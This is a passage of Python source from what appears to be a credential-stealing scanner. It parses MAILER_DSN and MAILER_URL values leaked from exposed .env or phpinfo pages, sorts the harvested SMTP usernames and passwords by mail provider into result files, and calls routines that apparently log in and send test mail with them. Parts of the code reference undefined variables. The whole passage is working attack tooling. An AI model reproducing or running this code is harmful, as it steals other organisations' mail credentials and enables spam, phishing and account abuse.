						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'outlook' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(HOTMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'qq' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(QQ).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'sina-email' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(SINA).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'strato' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(STRATO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'synaq' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(SYNAQ).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'yihigher' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(YIGHER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'zmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(ZMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'rise-tokyo' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(RISE-TOKIO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'tatsumi-b' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(TATSUMI).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1

					elif 'sendinblue' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(SENDINBLUE).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					else:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+'::ssl::::0:'
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(RANDOM).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					return True
			else:
				return False
		except:
			return False
	def get_smtp2(self, text, url):
		oke = 0
		try:
			if "MAILER_DSN" in text:
				if "MAILER_DSN" in text:
					method = '/.env'
					get_smtp = re.findall('MAILER_DSN.*<td class="v">(.*?)</td></tr>', text)

				if '.amazonaws.com' in str(get_smtp):
					getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
					build = str(mailuser)+':'+str(mailpass)+':'+str(mailhost)
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/'+getcountry[:-2]+'.txt', 'a')
					save.write(remover+'\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Result(Yii)/SMTP(AWS).txt', 'a')
					save2.write(remover+'\n')
					save2.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
				elif 'sendgrid' in str(get_smtp):
					build = str(mailuser)+':'+str(mailpass)
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(SENDGRID).txt', 'a')
					save.write(remover+'\n')
					save.close()
					ceker_sendgrid2(url, mailpass)
					build = str(url)+' -- '+ str(get_smtp[0])
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open('Result(Yii)/sendgrid.txt','a')
					save3.write(remover2+'\n')
					save3.close()
					ceker_sendgrid2(url, mailpass)
				elif 'office365' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(OFFICE365).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '1and1' in str(get_smtp) or '1und1' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(1AND1).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'zoho' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ZOHO).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'mandrillapp' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(MANDRILL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'mailgun' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(MAILGUN).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '.it' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ITALY).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'emailsrvr' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(RACKSPACE).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'hostinger' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(HOSTINGER).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '.yandex' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(YANDEX).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '.OVH' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(OVH).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '.ionos' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(IONOS).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'zimbra' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ZIMBRA).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'kasserver.com' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(KASSASERVER).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'smtp-relay.gmail' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(RANDOM).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'sparkpostmail.com' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(SPARKPOST).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '.jp' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(JAPAN).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'gmoserver' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(GMO).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1

				elif 'mailjet' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(MAILJET).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'gmail.com' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(GMAIL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'googlemail' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(GOOGLEMAIL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'aruba.it' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ARUBA).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'hetzner' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(HETZNER).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '163' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(163).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '263' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(263).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'Aliyun' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ALIYUN).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'att.net' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ATTNET).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'chinaemail' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(CHINAEMAIL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'comcast' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(COMCAST).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'cox.net' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(COX).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'earthlink' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(EARTH).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'global-mail' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(GLOBAL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'gmx' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(GMX).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'godaddy' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(GODADDY).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'hinet' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(HINET).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'hotmail' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(HOTMAIL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'mail.ru' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(MAILRU).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'mimecast' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(RANDOM).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'mweb' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(MWEB).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'netease' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(NETEASE).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'NetworkSolutions' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(NETWORK).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'outlook' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(HOTMAIL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'qq' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(QQ).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'sina-email' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(SINA).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'strato' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(STRATO).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'synaq' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(SYNAQ).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'yihigher' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(YIGHER).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'zmail' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ZMAIL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'rise-tokyo' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(RISE-TOKIO).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'tatsumi-b' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(TATSUMI).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1

				elif 'sendinblue' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(SENDINBLUE).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				else:
					build = str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(RANDOM).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, satu.split(':')[1], satu.split(':')[2], satu.split('username=')[3],
							   satu.split('password=')[4])
					smtp_login(text, 'env', satu.split(':')[1], satu.split(':')[2], satu.split(':')[3],
							   satu.split(':')[4])
					oke += 1
				return True

			else:
				return False
		except:
			return False
	def get_smtp3(self, text, url):
		oke = 0
		try:
			if "MAILER_URL" in text:
				if "MAILER_URL" in text:
					method = '/.env'
					get_smtp = re.findall('MAILER_URL.*<td class="v">(.*?)</td></tr>', text)

				if '.amazonaws.com' in str(get_smtp):
					getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
					build = str(mailuser)+':'+str(mailpass)+':'+str(mailhost)
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/'+getcountry[:-2]+'.txt', 'a')
					save.write(remover+'\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Result(Yii)/SMTP(AWS).txt', 'a')
					save2.write(remover+'\n')
					save2.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
				elif 'sendgrid' in str(get_smtp):
					build = str(mailuser)+':'+str(mailpass)
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(SENDGRID).txt', 'a')
					save.write(remover+'\n')
					save.close()
					ceker_sendgrid2(url, mailpass)
					build = str(url)+' -- '+ str(get_smtp[0])
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open('Result(Yii)/sendgrid.txt','a')
					save3.write(remover2+'\n')
					save3.close()
					ceker_sendgrid2(url, mailpass)
				elif 'office365' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
